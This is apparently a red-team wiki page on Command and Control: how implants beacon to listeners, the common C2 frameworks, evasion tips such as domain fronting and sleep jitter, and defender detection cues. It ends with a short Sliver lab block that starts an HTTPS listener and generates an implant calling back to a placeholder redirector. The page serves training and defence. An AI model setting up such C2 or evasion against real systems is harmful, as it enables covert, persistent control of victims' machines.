# Command and Control (C2)

Command and Control (C2) is how an attacker keeps talking to a compromised host after initial access - sending commands and receiving output. A C2 framework manages implants (the agents running on victims), listeners (where they call back), and the operator console. Setting up reliable, quiet C2 is a core red-team skill ([CRTO](../Certifications/CRTO.md) is built around it).

## How it works

1. An **implant / beacon** runs on the victim and periodically calls back to a **listener** you control.
2. Traffic rides a **channel** (HTTPS, DNS, SMB named pipes) chosen to blend in.
3. The operator issues tasks; the implant executes and returns results.
4. **Beaconing** uses sleep + jitter so callbacks are not an obvious regular heartbeat.

## Common frameworks

- **Cobalt Strike** - the commercial standard; Beacon, malleable C2 profiles. Used in the CRTO course.
- **Sliver** (BishopFox) - open-source, cross-platform, mTLS/HTTP/DNS/WireGuard, very popular now.
- **Havoc** - open-source, modern, with a capable Demon agent.
- **Mythic** - multi-agent, containerized, extensible C2.
- **Metasploit / Meterpreter** - fine for labs, heavily signatured for real ops.

## OPSEC and evasion for C2

- **Redirectors and domain fronting / CDN** so the real team server is hidden.
- **Malleable profiles** to make traffic look like normal web browsing.
- **Long sleep + jitter** to avoid beaconing detection.
- Pick channels that fit the environment (DNS where HTTP egress is filtered).
- Pair with [AV/EDR evasion](AV%20and%20EDR%20Evasion.md) so the implant survives on the host.

## What defenders look for

- Regular beacon intervals, odd JA3/TLS fingerprints, long-lived connections
- Named-pipe lateral movement, suspicious parent/child processes
- Known tool signatures and default profiles - which is why operators customize everything

## Lab practice

```bash
# Sliver quick start (authorized labs only)
sliver
> https                       # start an HTTPS listener
> generate --http your-redirector.tld --save ./implant
# run the implant on your lab victim, then:
> sessions
> use <id>
```

## Related

- [Red Team Methodology](Red%20Team%20Methodology.md), [AV and EDR Evasion](AV%20and%20EDR%20Evasion.md)
- [MITRE ATT&CK](MITRE%20ATT%26CK.md) - C2 is tactic TA0011
